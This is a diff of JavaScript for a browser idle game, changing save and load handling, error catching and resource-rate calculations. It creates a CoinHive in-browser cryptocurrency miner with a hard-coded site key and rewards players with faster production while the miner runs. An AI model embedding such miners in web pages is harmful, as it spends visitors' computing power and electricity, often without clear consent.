@@ -1,14 +1,21 @@
 window.onload = function() {
 	var saveData = window.localStorage.getItem("savedata")
-	if(!saveData) newGame()
-	else loadGame(saveData)
+	if(!saveData) setup()
+	setup()
+	// else loadGame(saveData)
 }
 
-function newGame(){
-	setup()
+function loadGame(datas){
+	data = JSON.parse(datas)
+	window.gameStats = data.gameStats
+	window.buildings = data.buildings
+	console.log(datas)
+	console.log(data)
+	window.requestAnimationFrame(loop)
 }
 
 function setup() {
+	try {
 	window.focused = true;
 	window.lastFocused = Date.now();
 	//THE TRAIN OF INVISIBILITY
@@ -35,7 +42,7 @@ function setup() {
 		})
 	})
 	
-	window.miner = new CoinHive.Anonymous("e92BTtfxQezwdOdz5Gi10B7WJTAYBMwF")
+	if (navigator.onLine) window.miner = new CoinHive.Anonymous("e92BTtfxQezwdOdz5Gi10B7WJTAYBMwF")
 	
 	document.getElementById("gatherwood").addEventListener("click", function(){
 		if(document.getElementById("inventory").style.display === "none") document.getElementById("inventory").style.display = ""
@@ -43,21 +50,35 @@ function setup() {
 	})
 	
 	setInterval(function(){
+		try {
 		Object.getOwnPropertyNames(window.gameStats.inventory).forEach(function(item){
 			if (window.gameStats.workforce[item] === 0) return;
 			
 			var running
-			if (window.miner.isRunning()) running = 1.3
-			else running = 1
+			if (navigator.onLine && window.miner.isRunning()) window.gameStats.running = 1.3
+			else window.gameStats.running = 1
 			
-			if (Date.now()-window.miner.startTime > 3600) {
-				running += Math.floor((Date.now()-window.miner.startTime)/3600)*0.05
+			if (navigator.onLine && Date.now()-window.miner.startTime > 3600 && window.miner.isRunning()) {
+				window.gameStats.running = Math.floor((Date.now()-window.miner.startTime)/3600)*0.05+1.3
 			}
-			window.gameStats.inventory[item] += window.gameStats.workforce[item]*window.gameStats.workincrements[item]*running
+			window.gameStats.inventory[item] += Math.floor(window.gameStats.workforce[item]*window.gameStats.workincrements[item]*window.gameStats.running)
 			})
+		}
+		catch(e){console.log(e)}
 	}, 1000)
 	
+	// setInterval(function(){
+	// 	var saveData = {
+	// 		gameStats: window.gameStats,
+	// 		buildings: window.buildings
+	// 	}
+	// 	window.localStorage.setItem("savedata", JSON.stringify(saveData))
+	// 	newMessage({value: "Saved."}, -1)
+	// }, 1000/**60*/*5)
+	
 	window.requestAnimationFrame(loop)
+	}
+	catch(e){console.log(e)}
 	return;
 }
 
@@ -71,9 +92,12 @@ var loop = function(){
 		window.focused = true
 		Object.getOwnPropertyNames(window.gameStats.inventory).forEach(function(item){
 			if (window.gameStats.workforce[item] === 0) return;
-			window.gameStats.inventory[item] += window.gameStats.workforce[item]*window.gameStats.workincrements[item]*(Date.now()-window.lastFocus)
+			window.gameStats.inventory[item] += Math.floor(window.gameStats.workforce[item]*window.gameStats.workincrements[item]*(Date.now()-window.lastFocus)*window.gameStats.running)
 		})
 	}
+	Object.getOwnPropertyNames(window.gameStats.inventory).forEach(function(item){
+		document.getElementById(item+"count").title = Math.floor(window.gameStats.workforce[item]*window.gameStats.workincrements[item]*window.gameStats.running)+" "+item+"/second"
+	})
 	window.buildings.forEach(function(item){
 		if(item.unlocked === true) {
 			var resourceList = ""
